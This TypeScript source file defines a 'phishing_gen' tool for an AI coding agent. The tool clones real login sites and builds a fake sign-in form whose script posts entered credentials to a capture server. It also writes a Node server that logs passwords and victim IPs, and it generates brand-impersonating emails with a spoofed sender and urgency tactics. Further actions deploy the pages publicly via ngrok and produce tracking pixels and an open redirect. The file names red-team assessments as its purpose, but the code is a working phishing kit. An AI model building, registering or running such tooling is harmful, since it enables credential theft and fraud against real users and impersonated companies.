export * as PhishingGenTool from "./phishing-gen"

import { ToolFailure } from "@opencode-ai/llm"
import { Effect, Layer, Schema } from "effect"
import { makeLocationNode } from "../effect/app-node"
import { AppProcess } from "../process"
import { ToolRegistry } from "./registry"
import { Tool } from "./tool"
import { Tools } from "./tools"
import { ChildProcess } from "effect/unstable/process"
import { Duration } from "effect"

export const name = "phishing_gen"

export const Input = Schema.Struct({
  action: Schema.String.annotate({
    description:
      "Action: 'clone' (clone a website for phishing), 'generate' (generate phishing email/template), 'harvest_form' (create credential harvest form), 'deploy' (deploy phishing page with local server), 'track' (generate tracking pixel/links)",
  }),
  target_url: Schema.String.pipe(Schema.optional).annotate({
    description: "URL of the site to clone (for 'clone' action). E.g. https://login.microsoftonline.com",
  }),
  brand: Schema.String.pipe(Schema.optional).annotate({
    description: "Brand to impersonate for 'generate' action (e.g. Microsoft, Google, Amazon, PayPal, Chase).",
  }),
  redirect_url: Schema.String.pipe(Schema.optional).annotate({
    description: "URL to redirect victim after credential capture. Default: the real site.",
  }),
  output_dir: Schema.String.pipe(Schema.optional).annotate({
    description: "Output directory for cloned/generated files. Default: ./phishing-output/",
  }),
  harvest_endpoint: Schema.String.pipe(Schema.optional).annotate({
    description: "Endpoint URL where harvested credentials will be sent. For 'harvest_form' action.",
  }),
  port: Schema.Number.pipe(Schema.optional).annotate({
    description: "Port for local deployment server (deploy action). Default: 8080.",
  }),
  email_target: Schema.String.pipe(Schema.optional).annotate({
    description: "Target email context for 'generate' action (e.g. 'password reset', 'account verification', 'security alert').",
  }),
})

const Output = Schema.Struct({
  output: Schema.String,
  exit: Schema.Number.pipe(Schema.optional),
})

const layer = Layer.effectDiscard(
  Effect.gen(function* () {
    const tools = yield* Tools.Service
    const appProcess = yield* AppProcess.Service

    yield* tools
      .register({
        [name]: Tool.make({
          description: `Generate phishing infrastructure: clone legitimate websites for credential harvesting, create branded phishing email templates, build credential capture forms with auto-submit, deploy phishing pages with local HTTP server, and generate tracking pixels/beacons. Supports all major brand impersonation. Essential for social engineering assessments and red team engagements.`,
          input: Input,
          output: Output,
          toModelOutput: ({ output }) => [{ type: "text", text: output.output }],
          execute: (input) =>
            Effect.gen(function* () {
              const shell = process.platform === "win32" ? (process.env.COMSPEC ?? "cmd.exe") : "/bin/sh"
              const outputDir = input.output_dir ?? "./phishing-output"
              const port = input.port ?? 8080

              switch (input.action) {
                case "clone": {
                  if (!input.target_url) return { output: "ERROR: 'target_url' required for clone action." }
                  // Use wget to mirror the site
                  const cmd = ChildProcess.make(
                    "bash",
                    ["-c", `mkdir -p ${outputDir} && wget -mkEpnp -np -e robots=off --convert-links -P ${outputDir} "${input.target_url}" 2>&1`],
                    { shell, stdin: "ignore", forceKillAfter: Duration.seconds(15) },
                  )
                  const result = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.minutes(5), maxOutputBytes: 10 * 1024 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                  return {
                    exit: result?.exitCode,
                    output: result?.output?.toString("utf8") ?? "Clone failed. wget not available. Try: curl or httrack.",
                  }
                }

                case "harvest_form": {
                  const endpoint = input.harvest_endpoint ?? "/capture"
                  const redirect = input.redirect_url ?? input.target_url ?? "https://google.com"
                  // Generate a credential harvest form that looks like a login page
                  const html = `<!DOCTYPE html>
<html><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign In</title>
<style>
body { font-family: 'Segoe UI', Arial, sans-serif; background: #f2f2f2; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
.login-box { background: white; padding: 2rem; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 320px; }
.login-box h2 { text-align: center; margin-bottom: 1.5rem; color: #333; }
.form-group { margin-bottom: 1rem; }
.form-group label { display: block; margin-bottom: 0.25rem; font-size: 0.875rem; color: #666; }
.form-group input { width: 100%; padding: 0.5rem; border: 1px solid #ccc; border-radius: 4px; font-size: 0.9rem; box-sizing: border-box; }
.btn { width: 100%; padding: 0.6rem; background: #0078d4; color: white; border: none; border-radius: 4px; font-size: 0.95rem; cursor: pointer; margin-top: 0.5rem; }
.btn:hover { background: #0068b5; }
.footer { text-align: center; margin-top: 1rem; font-size: 0.75rem; color: #999; }
</style>
</head><body>
<div class="login-box">
  <h2>Sign in</h2>
  <form action="${endpoint}" method="POST" id="loginForm">
    <div class="form-group">
      <label>Email or phone</label>
      <input type="text" name="email" required autocomplete="username">
    </div>
    <div class="form-group">
      <label>Password</label>
      <input type="password" name="password" required autocomplete="current-password">
    </div>
    <button type="submit" class="btn">Sign in</button>
  </form>
  <div class="footer">© ${new Date().getFullYear()} ${input.brand ?? "Sign In"}</div>
</div>
<script>
document.getElementById('loginForm').addEventListener('submit', function(e) {
  // Capture credentials before redirect
  var data = new FormData(this);
  fetch('${endpoint}', { method: 'POST', body: data }).then(function() {
    window.location.href = '${redirect}';
  }).catch(function() {
    window.location.href = '${redirect}';
  });
  e.preventDefault();
});
</script>
</body></html>`

                  // Also generate the capture server script
                  const serverScript = `const http = require('http');
const fs = require('fs');
const server = http.createServer((req, res) => {
  if (req.method === 'POST' && req.url === '${endpoint}') {
    let body = '';
    req.on('data', c => body += c);
    req.on('end', () => {
      const entry = \`\${new Date().toISOString()} | \${body} | \${req.socket.remoteAddress}\\n\`;
      fs.appendFileSync('credentials.log', entry);
      console.log('[CAPTURED]', entry.trim());
      res.writeHead(200);
      res.end('OK');
    });
  } else {
    fs.readFile('index.html', (err, data) => {
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(err ? 'Not found' : data);
    });
  }
});
server.listen(${port}, () => console.log('Phishing server running on port ${port}'));`

                  yield* Effect.promise(async () => {
                    const { mkdir } = await import("node:fs/promises")
                    await mkdir(outputDir, { recursive: true }).catch(() => {})
                    await Bun.write(`${outputDir}/index.html`, html)
                    await Bun.write(`${outputDir}/server.js`, serverScript)
                  })

                  return {
                    exit: 0,
                    output: `✅ Phishing infrastructure generated in ${outputDir}/\n\nFiles:\n- index.html (credential harvest page)\n- server.js (credential capture server)\n\nDeploy:\n  cd ${outputDir} && node server.js\n\nServer listens on port ${port}.\nAll captured credentials saved to credentials.log\n\nRedirect victims to: http://YOUR_IP:${port}/`,
                  }
                }

                case "generate": {
                  const brand = input.brand ?? "Microsoft"
                  const context = input.email_target ?? "password reset"
                  const template = `Subject: [Action Required] ${context.charAt(0).toUpperCase() + context.slice(1)} - ${brand} Account

From: ${brand} Security <security@${brand.toLowerCase().replace(/\s/g, "")}-support.com>
To: [victim email]

Dear User,

We detected unusual activity on your ${brand} account and require you to verify your identity immediately.

Failure to verify within 24 hours will result in temporary account suspension.

Click here to verify: [PHISHING LINK]

If you did not initiate this request, please contact ${brand} Support immediately.

Thank you,
${brand} Account Security Team

---

PHISHING EMAIL TEMPLATE GENERATED
- Brand: ${brand}
- Context: ${context}
- Urgency: 24 hours (creates time pressure)
- Threat: Account suspension (fear of loss)
- Action: Click link (credential capture)

Send via:
- GoPhish: gophish campaign
- Social Engineering Toolkit (SET)
- Manual SMTP relay`
                  return { exit: 0, output: template }
                }

                case "deploy": {
                  const cmd = ChildProcess.make(
                    "bash",
                    ["-c", `cd ${outputDir} && (python3 -m http.server ${port} 2>&1 &) && echo "Server started on port ${port}"`],
                    { shell, stdin: "ignore", forceKillAfter: Duration.seconds(5) },
                  )
                  const result = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.seconds(30), maxOutputBytes: 256 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                  return {
                    exit: result?.exitCode,
                    output: `Phishing server deployed on port ${port}.\nDirectory: ${outputDir}\nURL: http://0.0.0.0:${port}\n\n${result?.output?.toString("utf8") ?? ""}\n\nUse ngrok for external access:\nngrok http ${port}`,
                  }
                }

                case "track": {
                  return {
                    output: `=== TRACKING INFRASTRUCTURE ===\n\n[Tracking Pixel - Email Open Tracking]\n<img src="http://YOUR_SERVER:PORT/pixel.gif?campaign=NAME&id=UNIQUE_ID" width="1" height="1">\n\n[Tracking Link - Click Tracking]\nhttp://YOUR_SERVER:PORT/r?campaign=NAME&url=REDIRECT_URL\n\n[Server Script - captures opens and clicks]\n\nconst http = require('http');\nhttp.createServer((req, res) => {\n  const log = \`\${new Date().toISOString()} | \${req.url} | \${req.headers['user-agent']} | \${req.socket.remoteAddress}\\n\`;\n  console.log(log);\n  if (req.url.includes('/pixel')) {\n    res.writeHead(200, {'Content-Type': 'image/gif'});\n    res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));\n  } else if (req.url.includes('/r?')) {\n    const url = new URL('http://localhost'+req.url).searchParams.get('url');\n    res.writeHead(302, {'Location': url});\n    res.end();\n  }\n}).listen(8080);\n\nUse GoPhish or King Phisher for full campaign management.`,
                  }
                }

                default:
                  return { output: `Unknown action: ${input.action}. Supported: clone, generate, harvest_form, deploy, track` }
              }
            }).pipe(Effect.mapError(() => new ToolFailure({ message: "Phishing generation failed" }))),
        }),
      })
      .pipe(Effect.orDie)
  }),
)

export const node = makeLocationNode({
  name: "tool/phishing-gen",
  layer,
  deps: [ToolRegistry.node, AppProcess.node],
})
